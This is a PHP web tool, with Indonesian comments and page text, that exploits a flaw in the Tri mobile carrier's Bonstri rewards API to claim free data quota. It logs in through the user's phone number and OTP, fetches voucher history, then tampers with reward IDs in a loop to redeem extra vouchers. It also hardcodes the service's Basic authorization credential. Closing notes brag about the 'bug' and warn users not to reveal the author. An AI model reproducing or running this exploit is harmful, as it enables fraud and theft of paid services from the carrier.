
<!--
/* Created By Masbim
*  Date : 23/04/2020
*    ______         ____  _____  ______   _______          _
*  .' ____ \       |_   \|_   _||_   _ `.|_   __ \        / \
*  | (___ \_| ______ |   \ | |    | | `. \ | |__) |      / _ \
*   _.____`..|______|| |\ \| |    | |  | | |  __ /      / ___ \
*  | \____) |       _| |_\   |_  _| |_.' /_| |  \ \_  _/ /   \ \_
*   \______.'      |_____|\____||______.'|____| |___||____| |____|
*
*                      Generator Kuota Tri Harian
*                        & Nelpon Gratis Sesama Tri
*    Powered By :
*    I-WRAH Tools & T-PhuTe x & X-ReRe Scripts
*
*    Usage : login no hp, verif otp, baca bismillah
*/
-->
<?php
$now = time();
// echo $now;
$date = '2020/04/24 :00:00';
echo "Jam Server gua ". date('H:i:s:d'),'<br>';
// if (strtotime($date) <= $now) {
// 	echo 'Selamat menunaikan ibadah puasa, jan lupa follow ig gue asw <a href="https://www.instagram.com/bima_pr/" target="_blank">@Bima_PR</a>';
// 	echo "<br>";
// 	echo "Status Closed at ".$date;
// 	die();
// }

// if (strtotime($date) > $now) {
//  $check1 = preg_match("/mozilla/", strtolower($_SERVER['HTTP_USER_AGENT']));
//  $check2 = preg_match("/chrome/", strtolower($_SERVER['HTTP_USER_AGENT']));
//  $check3 = preg_match("/opera/", strtolower($_SERVER['HTTP_USER_AGENT']));
//  $check4 = preg_match("/windows/", strtolower($_SERVER['HTTP_USER_AGENT']));
//  if ($check1 > 0 or $check2 > 0 or $check3 > 0 or $check4 > 0) {
//      echo "Date Now ".date('Y/m/d')."<br>Expired ".$date;
//      echo "<br>MasbimCh";
//  }else{
//      echo file_get_contents('https://masbim.net/tv/tvms.php');
//  }
// } else {
//     echo "serv-iwrah.net.local";
// }
?>

<!DOCTYPE html>
<html>
<head>
	<title>Generate Kuota</title>
	<style type="text/css">
		p{
			margin-top: 2px;
			margin-bottom: 5px;	
		}
	</style>
</head>
<body>
<table border="1">
	<form method="post" autocomplete="off" action="?submit">
	<tr>
		<td colspan="4" align="center">Tools By S-NDRA</td>
	</tr>
	
	<?php
		session_start();
		if (!isset($_SESSION['no_hp'])) {
			echo '<tr>
		<td>No HP</td>
		<td>:</td>
		<td><input style="width: 250px;" type="text" name="nohp" required></td>
	</tr>';
		}else{
			if (isset($_GET['get'])) {
				$get = preg_replace('/[^a-zA-Z0-9]/', '', $_GET['get']);
				$get = strtolower($get);
				if ($get=='resend') {
					$_SESSION['submit_nohp'] = 'TRUE';
					echo send_otp_bonstri($_SESSION['no_hp']);
				}
			}
		}
		if (isset($_SESSION['otp'])) {
			echo '<tr>
		<td>OTP Code</td>
		<td>:</td>
		<td><input style="width: 250px;" type="text" name="otp" required></td>
		<td><a href="?get=resend">resend</a></td>
	</tr>';
		}
		if (isset($_POST['submit'])) {
			if (isset($_POST['nohp'])) {
				if (!empty($_POST['nohp'])) {
					if (!is_numeric($_POST['nohp'])) {
						echo '	<tr>
									<td colspan="4" align="center" width="200px;"><font style="color: red;">nomor harus angka, ex 0896xxxxxxx or +62896xxxxxxxx or 62896xxxxxxx</font></td>
								</tr>';
					}else{
						$no_hp = preg_replace('/[^0-9\+]/', '', $_POST['nohp']);
						if (strlen($no_hp)>=11) {
							// echo substr($no_hp, 0, 1);
							if (substr($no_hp, 0, 1)=='+') {
								$no_hp = substr($no_hp, 1);
							}

							if (substr($no_hp, 0, 1)=='0') {
								$no_hp = substr($no_hp, 1);
							}

							if (substr($no_hp, 0, 2)=='62') {
								$no_hp = substr($no_hp, 2);
							}

							if (substr($no_hp, 0, 2)!='89') {
								echo '	<tr>
											<td colspan="4" align="center"><font style="color: red;">No hp harus Kartu tri</font></td>
										</tr>';
							}else{
								$_SESSION['no_hp'] = $no_hp;
								$_SESSION['submit_nohp'] = 'TRUE';
								echo '<script type="text/javascript">window.location = window.location</script>';
								echo send_otp_bonstri($_SESSION['no_hp']);
							}
						}else{
							echo '	<tr>
										<td colspan="4" align="center"><font style="color: red;">No hp harus lebih dari 11 karakter</font></td>
									</tr>';
						}
					}
				}else{
					echo '	<tr>
								<td colspan="4" align="center"><font style="color: red;">Heran becanda, isi dulu no hpnya</font></td>
							</tr>';
				}
			}
			if (isset($_POST['otp'])) {
				if (!empty($_POST['otp'])) {
					if (!is_numeric($_POST['otp'])) {
						echo '	<tr>
									<td colspan="4" align="center" width="200px;"><font style="color: red;">OTP setau gue angka cuks</font></td>
								</tr>';
					}else{
						$otp = preg_replace('/[^0-9]/', '', $_POST['otp']);
						// echo $otp;
						// echo $_SESSION['no_hp'];
						$login = login_bonstri($_SESSION['no_hp'], $otp);

						if ($login['error']=='unauthorized') {
							echo '	<tr>
									<td colspan="4" align="center" width="200px;"><font style="color: red;">Kode otp salah cuks</font></td>
								</tr>';
						}else{
							// var_dump($login);
							if (preg_match('/access_token/', json_encode($login))) {
								$token = $login['access_token'];
								$histori = history_voucher($token);
								if (preg_match('/"data"/', json_encode($histori))) {
									unset($_SESSION['otp']);
									$data_histori = $histori['data'];
									if (count($data_histori)>=1) {
										// var_dump($data_histori);
										foreach ($data_histori as $tembak) {
											$hajaran = rand(1,3);
											echo '	<tr>
														<td colspan="4" align="center" width="200px;"><font style="color: green;">'.$tembak['rewardDescription']." - Gue hajar ".$hajaran."x".'</font></td>
													</tr>';
											$rewardId = $tembak['rewardId'];
											$randoman = rand(11111,99999);
											$rewardId = $rewardId-$randoman;
											// echo $tembak['rewardId']."=>".$rewardId;
											$rewardTransactionId = $tembak['rewardTransactionId'];
											$no=0;
											for ($i=1; $i <=$hajaran; $i++) {
												$rewardId = $rewardId+$no;
												// echo $rewardId."|";
												$hajargeh = hajar($token, $rewardId, $rewardTransactionId);
												if ($hajargeh['message']!="Success") {
													// echo "Yang ke ".$no." Gagal cuks";
													echo '	<tr>
														<td colspan="4" align="center" width="200px;"><font style="color: red;">Yang ke '.$no.' Gagal cuks</font></td>
													</tr>';
													break;
												}
												$no++;

											}

										}
										session_destroy();
									}else{
										$redeem = reedem($token);
										if ($redeem['status']==true) {
											echo "redem sekali ini sadja, buat ngambil sess id voucher";
										}else{
											echo "Coba tukerin dulu sekali bonus trinya buat kuota, yang murah aja, nanti test lagi";
										}
									}
								  
								}else{
									echo "opps ";
								}
							}else{
								echo '	<tr>
									<td colspan="4" align="center" width="200px;"><font style="color: red;">Contact ig  <a href="https://www.instagram.com/bima_pr/" target="_blank">@Bima_PR</a> please!!! something went wrong.</font></td>
								</tr>';
							}
						}
					}
				}else{
					echo '	<tr>
								<td colspan="4" align="center"><font style="color: red;">Heran becanda, isi dulu no hpnya</font></td>
							</tr>';
				}
			}
		}

		if (isset($_SESSION['submit_nohp'])) {
			echo '	<tr>
						<td colspan="4" align="center"><font style="color: black;">OTP Telah dikirim ke no hp 0'.$_SESSION['no_hp'].'</font></td>
					</tr>';
			unset($_SESSION['submit_nohp']);
			$_SESSION['otp'] = 'menunggu';
		}
		
	?>
	<tr>
		<td colspan="4" align="center"><input type="submit" name="submit"></td>
	</tr>
	
	</form>
</table>
</body>
</html>
<?php
function send_otp_bonstri($no_hp){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://bonstri.tri.co.id/api/v1/login/request-otp');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"msisdn\":\"0".$no_hp."\"}");
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Accept: application/json, text/plain, */*';
	$headers[] = 'Dnt: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1';
	$headers[] = 'Content-Type: application/json';
	$headers[] = 'Origin: http://bonstri.tri.co.id';
	$headers[] = 'Referer: http://bonstri.tri.co.id/login?returnUrl=%2Fhome';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$result = curl_exec($ch);
	if (curl_errno($ch)) {
	    echo 'Error:' . curl_error($ch);
	}
	$result = json_decode($result, true);
	// return $result;
	curl_close($ch);
}

function login_bonstri($no_hp, $otp){
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'http://bonstri.tri.co.id/api/v1/login/validate-otp');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "grant_type=password&username=0".$no_hp."&password=".$otp."");
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Accept: application/json, text/plain, */*';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Authorization: Basic Ym9uc3RyaTpib25zdHJpc2VjcmV0';
	$headers[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1';
	$headers[] = 'Content-Type: application/x-www-form-urlencoded';
	$headers[] = 'Origin: http://bonstri.tri.co.id';
	$headers[] = 'Referer: http://bonstri.tri.co.id/login?returnUrl=%2Fhome';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);
	if (curl_errno($ch)) {
	    echo 'Error:' . curl_error($ch);
	}
	// var_dump($result);
	// echo "string";
	// echo $result;
	$result = json_decode($result, true);
	return $result;
	curl_close($ch);
}

function history_voucher($token){
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'http://bonstri.tri.co.id/api/v1/voucherku/voucher-history');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "{}");
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Accept: application/json, text/plain, */*';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Authorization: Bearer '.$token;
	$headers[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1';
	$headers[] = 'Content-Type: application/json';
	$headers[] = 'Origin: http://bonstri.tri.co.id';
	$headers[] = 'Referer: http://bonstri.tri.co.id/voucherku';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);
	if (curl_errno($ch)) {
	    echo 'Error:' . curl_error($ch);
	}
	$result = json_decode($result, true);
	return $result;
	curl_close($ch);
}

function reedem($token){
	$ch = curl_init();

	curl_setopt($ch, CURLOPT_URL, 'http://bonstri.tri.co.id/api/v1/tukar-points/redeem');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"rewardId\":\"23111801\"}");
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Accept: application/json, text/plain, */*';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Authorization: Bearer '.$token;
	$headers[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1';
	$headers[] = 'Content-Type: application/json';
	$headers[] = 'Origin: http://bonstri.tri.co.id';
	$headers[] = 'Referer: http://bonstri.tri.co.id/tukarpoint';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);
	$result = json_decode($result, true);
	return $result;
	if (curl_errno($ch)) {
	    echo 'Error:' . curl_error($ch);
	}
	curl_close($ch);
}

function hajar($token, $rewardId, $rewardTransactionId){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://bonstri.tri.co.id/api/v1/voucherku/get-voucher-code');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"rewardId\":\"".$rewardId."\",\"rewardTransactionId\":\"".$rewardTransactionId."\"}");
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Accept: application/json, text/plain, */*';
	$headers[] = 'Dnt: 1';
	$headers[] = 'Authorization: Bearer '.$token;
	$headers[] = 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1';
	$headers[] = 'Content-Type: application/json';
	$headers[] = 'Origin: http://bonstri.tri.co.id';
	$headers[] = 'Referer: http://bonstri.tri.co.id/voucherku';
	$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
	$headers[] = 'Cookie: _gat_gtag_UA_128593534_1=1';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

	$result = curl_exec($ch);

	if (curl_errno($ch)) {
	    echo 'Error:' . curl_error($ch);
	}
	$result = json_decode($result, true);
	return $result;
	curl_close($ch);
}
if (strtotime($date) >= $now) {
	echo "Ditutup ".$date;
	echo "<br> ";
	echo 'Status <font style="color: green;">OPEN</font>';
}
?>
<p>Note: Jangan bawa bawa nama gua bangsat. lu udah gua kasih enak juga</p>
<p>Gunain sekali submit aja, ngapain lu show off show off</p>
<p>inget ini bug dari kuota bonus tri, kalo lu belom perna nukerin bonustri, tukerin dulu sekali, kalo udah pernah ya gass aja</p>
<p>KUOTA BONSTRI BIASANYA SEHARI & AKTIF DARI JAM 00:00-12:00, AON? Jangan harap kukasih</p>
